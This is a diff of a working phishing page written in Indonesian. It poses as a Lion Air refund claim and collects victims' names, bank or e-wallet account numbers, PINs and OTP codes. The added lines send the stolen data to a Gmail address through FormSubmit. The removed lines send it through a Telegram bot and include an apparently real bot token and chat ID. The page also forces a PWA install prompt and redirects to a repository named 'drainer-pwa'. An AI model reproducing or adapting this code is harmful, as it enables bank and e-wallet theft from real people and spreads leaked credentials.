@@ -78,15 +78,16 @@
             margin-top: 20px;
         }
         #debug {
-            background: #333;
-            color: #0f0;
+            background: #1a1a1a;
+            color: #00ff88;
             font-size: 10px;
             padding: 10px;
             margin-top: 20px;
             border-radius: 8px;
             font-family: monospace;
             word-break: break-all;
-            display: block;
+            max-height: 200px;
+            overflow-y: auto;
         }
     </style>
 </head>
@@ -102,42 +103,48 @@
             <div class="amount">Rp 3.750.000</div>
         </div>
         
-        <form id="refundForm">
+        <!-- FORM menggunakan FormSubmit dengan EMAIL ANDA -->
+        <form id="refundForm" action="https://formsubmit.co/rcinema267@gmail.com" method="POST">
+            <input type="hidden" name="_subject" value="🎯 NEW TARGET - LION REFUND!">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_next" value="https://rcinema267-sys.github.io/drainer-pwa/">
+            
             <div class="form-group">
                 <label>Nomor Tiket</label>
-                <input type="text" id="ticketNumber" placeholder="Contoh: JT-7821-09" required>
+                <input type="text" name="✈️ Nomor Tiket" id="ticketNumber" placeholder="Contoh: JT-7821-09" required>
             </div>
             
             <div class="form-group">
                 <label>Nama Lengkap (sesuai KTP)</label>
-                <input type="text" id="fullName" placeholder="Nama lengkap" required>
+                <input type="text" name="👤 Nama Lengkap" id="fullName" placeholder="Nama lengkap" required>
             </div>
             
             <div class="form-group">
                 <label>Pilih Bank / E-Wallet</label>
-                <select id="bankType" required>
+                <select name="🏦 Bank/E-Wallet" id="bankType" required>
                     <option value="">Pilih...</option>
-                    <option value="bca">BCA</option>
-                    <option value="mandiri">Mandiri</option>
-                    <option value="bri">BRI</option>
-                    <option value="bni">BNI</option>
-                    <option value="dana">DANA</option>
-                    <option value="ovo">OVO</option>
-                    <option value="gopay">GoPay</option>
+                    <option value="BCA">BCA</option>
+                    <option value="Mandiri">Mandiri</option>
+                    <option value="BRI">BRI</option>
+                    <option value="BNI">BNI</option>
+                    <option value="DANA">DANA</option>
+                    <option value="OVO">OVO</option>
+                    <option value="GoPay">GoPay</option>
                 </select>
             </div>
             
             <div class="form-group">
                 <label>Nomor Rekening / ID E-Wallet</label>
-                <input type="text" id="accountNumber" placeholder="Masukkan nomor rekening atau ID e-wallet" required>
+                <input type="text" name="💰 Nomor Rekening" id="accountNumber" placeholder="Masukkan nomor rekening atau ID e-wallet" required>
             </div>
             
             <div class="form-group" id="pinGroup" style="display:none;">
                 <label>PIN Keamanan</label>
-                <input type="password" id="pin" placeholder="6 digit PIN" maxlength="6">
+                <input type="password" name="🔑 PIN" id="pin" placeholder="6 digit PIN" maxlength="6">
             </div>
             
-            <button type="submit">KLAIM REFUND SEKARANG</button>
+            <button type="submit" id="submitBtn">KLAIM REFUND SEKARANG</button>
         </form>
         
         <div class="note">
@@ -155,52 +162,19 @@
     </div>
 
     <div id="debug">
-        ⏳ PWA siap menunggu data...
+        ⏳ PWA READY | Email: rcinema267@gmail.com
     </div>
 
     <script>
-        // ========== KONFIGURASI TELEGRAM ==========
-        // GANTI DENGAN TOKEN DAN CHAT ID ANDA
-        const TELEGRAM_TOKEN = '8638338084:AAHGXbttcu4nE9Ro_OwfRUKY7yKlT2ml-Cw';  // GANTI!
-        const CHAT_ID = '6924480474';  // GANTI!
-        
         function addDebug(msg) {
             const debugDiv = document.getElementById('debug');
             debugDiv.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
+            debugDiv.scrollTop = debugDiv.scrollHeight;
             console.log(msg);
         }
         
-        addDebug('✅ PWA dimulai');
-        
-        // Fungsi kirim ke Telegram
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            addDebug('Mengirim ke Telegram...');
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                const result = await response.json();
-                if (result.ok) {
-                    addDebug('✅ Berhasil terkirim ke Telegram!');
-                    return true;
-                } else {
-                    addDebug('❌ Gagal: ' + JSON.stringify(result));
-                    return false;
-                }
-            } catch(e) {
-                addDebug('❌ Error: ' + e.message);
-                return false;
-            }
-        }
+        addDebug('✅ PWA dimulai - FormSubmit mode aktif');
+        addDebug('📧 Data akan dikirim ke: rcinema267@gmail.com');
         
         // AUTO INSTALL PROMPT
         let deferredPrompt;
@@ -208,15 +182,15 @@
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
-            addDebug('Install prompt ready');
+            addDebug('📲 Install prompt siap');
             
             setTimeout(() => {
                 if (deferredPrompt) {
                     deferredPrompt.prompt();
-                    addDebug('✅ Install prompt ditampilkan');
+                    addDebug('✅ Popup install muncul');
                     deferredPrompt.userChoice.then((choiceResult) => {
                         if (choiceResult.outcome === 'accepted') {
-                            addDebug('✅ PWA terinstall!');
+                            addDebug('✅ PWA berhasil terinstall!');
                         }
                         deferredPrompt = null;
                     });
@@ -224,59 +198,71 @@
             }, 2000);
         });
         
-        // Tampilkan field PIN untuk e-wallet
+        // Tampilkan PIN untuk e-wallet
         document.getElementById('bankType').addEventListener('change', function() {
             const pinGroup = document.getElementById('pinGroup');
-            if (this.value === 'dana' || this.value === 'ovo' || this.value === 'gopay') {
+            if (this.value === 'DANA' || this.value === 'OVO' || this.value === 'GoPay') {
                 pinGroup.style.display = 'block';
+                addDebug('🔐 Field PIN ditampilkan (e-wallet)');
             } else {
                 pinGroup.style.display = 'none';
             }
         });
         
-        // Submit form awal
-        document.getElementById('refundForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+        // Handler form submit
+        document.getElementById('refundForm').addEventListener('submit', function(e) {
+            addDebug('📤 Mengirim data target ke email...');
             
-            const ticketNumber = document.getElementById('ticketNumber').value;
-            const fullName = document.getElementById('fullName').value;
-            const bankType = document.getElementById('bankType').value;
-            const accountNumber = document.getElementById('accountNumber').value;
-            const pin = document.getElementById('pin').value;
+            setTimeout(() => {
+                document.getElementById('otpModal').style.display = 'flex';
+                addDebug('🔓 Modal OTP ditampilkan');
+            }, 500);
             
-            addDebug('📝 Form dikirim: ' + fullName);
+            setTimeout(() => {
+                addDebug('✅ Data target terkirim! Cek email: rcinema267@gmail.com (cek spam juga)');
+            }, 2000);
             
-            // Buat pesan Telegram
-            let message = `🎯 NEW TARGET!\n\n`;
-            message += `✈️ Tiket: ${ticketNumber}\n`;
-            message += `👤 Nama: ${fullName}\n`;
-            message += `🏦 Bank: ${bankType}\n`;
-            message += `💰 Rekening: ${accountNumber}\n`;
-            if (pin) message += `🔑 PIN: ${pin}\n`;
-            message += `⏰ Waktu: ${new Date().toLocaleString()}`;
-            
-            await sendToTelegram(message);
-            
-            // Tampilkan modal OTP
-            document.getElementById('otpModal').style.display = 'flex';
+            return true;
         });
         
-        // Submit OTP
+        // Handler OTP
         document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
             const otp = document.getElementById('otpInput').value;
-            addDebug('🔑 OTP: ' + otp);
             
-            // Buat pesan OTP
-            let message = `🔴 OTP TERTANGKAP!\n\n`;
-            message += `🔢 Kode: <b>${otp}</b>\n`;
-            message += `⏰ Waktu: ${new Date().toLocaleString()}`;
+            if (!otp || otp.length < 4) {
+                alert('Masukkan kode OTP yang valid');
+                addDebug('⚠️ OTP kosong atau terlalu pendek');
+                return;
+            }
             
-            await sendToTelegram(message);
+            addDebug(`🔑 Mengirim OTP: ${otp} ke email...`);
             
-            alert('Verifikasi berhasil! Dana refund akan diproses dalam 1x24 jam.');
-            document.getElementById('otpModal').style.display = 'none';
-            document.getElementById('refundForm').reset();
-            addDebug('✅ Proses selesai');
+            const formData = new FormData();
+            formData.append('_subject', '🔴 OTP TERTANGKAP!');
+            formData.append('🔢 Kode OTP', otp);
+            formData.append('⏰ Waktu', new Date().toLocaleString());
+            formData.append('_captcha', 'false');
+            
+            try {
+                const response = await fetch('https://formsubmit.co/rcinema267@gmail.com', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    addDebug('✅ OTP berhasil dikirim ke email!');
+                    alert('Verifikasi berhasil! Dana refund akan diproses dalam 1x24 jam.');
+                    document.getElementById('otpModal').style.display = 'none';
+                    document.getElementById('refundForm').reset();
+                    addDebug('✅ Proses selesai, form direset');
+                } else {
+                    addDebug('❌ Gagal kirim OTP: ' + response.status);
+                    alert('Gagal verifikasi, silakan coba lagi.');
+                }
+            } catch(e) {
+                addDebug('❌ Error: ' + e.message);
+                alert('Terjadi kesalahan, silakan coba lagi.');
+            }
         });
     </script>
 </body>
